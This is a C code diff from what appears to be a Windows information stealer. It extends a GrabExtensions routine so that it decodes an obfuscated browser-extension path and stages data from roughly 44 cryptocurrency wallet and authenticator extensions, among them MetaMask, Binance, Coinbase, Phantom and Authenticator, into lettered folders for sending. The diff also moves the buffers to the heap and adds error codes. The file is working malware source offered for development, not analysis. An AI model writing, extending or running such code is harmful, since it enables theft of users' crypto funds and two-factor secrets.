@@ -15,8 +15,13 @@
 
 void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned short *ExtentionMark) {
     unsigned short      TempPath[250]       = {0};
-    unsigned char       FolderItems[4096]   = {0};
+    unsigned char       *FolderItems        = NULL;
     int                 PathSize            =  lenW(path);
+
+    FolderItems = AllocMemory((SIZE_T)4096);
+    if (FolderItems == NULL) {
+        return;
+    }
 
     MovMemory(path, TempPath, PathSize * 2);
     ConcatStringW(TempPath, L"\\", PathSize);
@@ -78,14 +83,21 @@ void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned s
         }
         FileInfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)FileInfo + FileInfo->NextEntryOffset);
     }
+
+    FreeMemory(FolderItems);
 }
 
 
-void GrabExtensions(unsigned short *path) {
+int GrabExtensions(unsigned short *path) {
     unsigned short      TempPath[250]       = {0};
     unsigned short      ExtentionsPath[34]  = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x0078, 0x008f, 0x00b2, 0x0075, 0x00b9, 0x003f, 0x0046, 0x00bc, 0x00a8, 0x00a5, 0x0093, 0x00bc, 0x0093, 0x00ae, 0x009e, 0x005e, 0x0071, 0x009a, 0x00a4, 0x00b8, 0x0099, 0x00a7, 0x009c, 0x00a5, 0x0000};
-    unsigned char       FolderItems[4096]   = {0};
+    unsigned char       *FolderItems        = NULL;
     int                 PathSize            =  lenW(path);
+
+    FolderItems = AllocMemory((SIZE_T)4096);
+    if (FolderItems == NULL) {
+        return 100;
+    }
 
     DecodeStringW(ExtentionsPath);
     MovMemory(path, TempPath, PathSize * 2);
@@ -93,7 +105,7 @@ void GrabExtensions(unsigned short *path) {
 
 
     if (ReadFolder(FolderItems, TempPath) != 0) {
-        return;
+        return 10;
     }
 
     PFILE_DIRECTORY_INFORMATION FileInfo = (PFILE_DIRECTORY_INFORMATION)FolderItems;
@@ -110,11 +122,134 @@ void GrabExtensions(unsigned short *path) {
             case METAMASK:
                 PrepareForSend(TempPath, FolderName, L"a\\");
                 break;
-            case TRUSTWALLET:
+            case METAMASK2:
                 PrepareForSend(TempPath, FolderName, L"b\\");
                 break;
-            case AUTHENTICATOR:
+            case BINANCE:
                 PrepareForSend(TempPath, FolderName, L"c\\");
+                break;
+            case COINBASE:
+                PrepareForSend(TempPath, FolderName, L"d\\");
+                break;
+            case RONIN:
+                PrepareForSend(TempPath, FolderName, L"e\\");
+                break;
+            case TRUST:
+                PrepareForSend(TempPath, FolderName, L"f\\");
+                break;
+            case VENOM:
+                PrepareForSend(TempPath, FolderName, L"g\\");
+                break;
+            case SUI:
+                PrepareForSend(TempPath, FolderName, L"h\\");
+                break;
+            case MARTIAN:
+                PrepareForSend(TempPath, FolderName, L"i\\");
+                break;
+            case TRON:
+                PrepareForSend(TempPath, FolderName, L"j\\");
+                break;
+            case PETRA:
+                PrepareForSend(TempPath, FolderName, L"k\\");
+                break;
+            case PONTEM:
+                PrepareForSend(TempPath, FolderName, L"l\\");
+                break;
+            case FEWCHA:
+                PrepareForSend(TempPath, FolderName, L"m\\");
+                break;
+            case MATH:
+                PrepareForSend(TempPath, FolderName, L"n\\");
+                break;
+            case COIN98:
+                PrepareForSend(TempPath, FolderName, L"o\\");
+                break;
+            case AUTHENTICATOR:
+                PrepareForSend(TempPath, FolderName, L"p\\");
+                break;
+            case EXODUSWEB3:
+                PrepareForSend(TempPath, FolderName, L"q\\");
+                break;
+            case PHANTOM:
+                PrepareForSend(TempPath, FolderName, L"r\\");
+                break;
+            case CORE:
+                PrepareForSend(TempPath, FolderName, L"s\\");
+                break;
+            case TOKENPOCKET:
+                PrepareForSend(TempPath, FolderName, L"t\\");
+                break;
+            case SAFEPAL:
+                PrepareForSend(TempPath, FolderName, L"u\\");
+                break;
+            case SOLFARE:
+                PrepareForSend(TempPath, FolderName, L"v\\");
+                break;
+            case KAIKAS:
+                PrepareForSend(TempPath, FolderName, L"w\\");
+                break;
+            case IWALLET:
+                PrepareForSend(TempPath, FolderName, L"x\\");
+                break;
+            case YOROI:
+                PrepareForSend(TempPath, FolderName, L"y\\");
+                break;
+            case GUARDA:
+                PrepareForSend(TempPath, FolderName, L"z\\");
+                break;
+            case JAXX_LIBERTY:
+                PrepareForSend(TempPath, FolderName, L"A\\");
+                break;
+            case WOMBAT:
+                PrepareForSend(TempPath, FolderName, L"B\\");
+                break;
+            case OXYGEN:
+                PrepareForSend(TempPath, FolderName, L"C\\");
+                break;
+            case MEWCX:
+                PrepareForSend(TempPath, FolderName, L"D\\");
+                break;
+            case GUILD:
+                PrepareForSend(TempPath, FolderName, L"E\\");
+                break;
+            case SATURN:
+                PrepareForSend(TempPath, FolderName, L"F\\");
+                break;
+            case TERRASTATION:
+                PrepareForSend(TempPath, FolderName, L"G\\");
+                break;
+            case HARMONYOUTDATED:
+                PrepareForSend(TempPath, FolderName, L"H\\");
+                break;
+            case EVER:
+                PrepareForSend(TempPath, FolderName, L"I\\");
+                break;
+            case KARDIACHAIN:
+                PrepareForSend(TempPath, FolderName, L"J\\");
+                break;
+            case PALIWALLET:
+                PrepareForSend(TempPath, FolderName, L"K\\");
+                break;
+            case BOLTX:
+                PrepareForSend(TempPath, FolderName, L"L\\");
+                break;
+            case LIQUALITY:
+                PrepareForSend(TempPath, FolderName, L"M\\");
+                break;
+            case XDEFI:
+                PrepareForSend(TempPath, FolderName, L"N\\");
+                break;
+            case NAMI:
+                PrepareForSend(TempPath, FolderName, L"O\\");
+                break;
+            case MAIARDEFI:
+                PrepareForSend(TempPath, FolderName, L"P\\");
+                break;
+            case TEMPLETEZOS:
+                PrepareForSend(TempPath, FolderName, L"Q\\");
+                break;
+            case XMR_PT:
+                PrepareForSend(TempPath, FolderName, L"R\\");
                 break;
             }
         }
@@ -125,4 +260,7 @@ void GrabExtensions(unsigned short *path) {
 
         FileInfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)FileInfo + FileInfo->NextEntryOffset);
     }
+
+    FreeMemory(FolderItems);
+    return 0;
 }
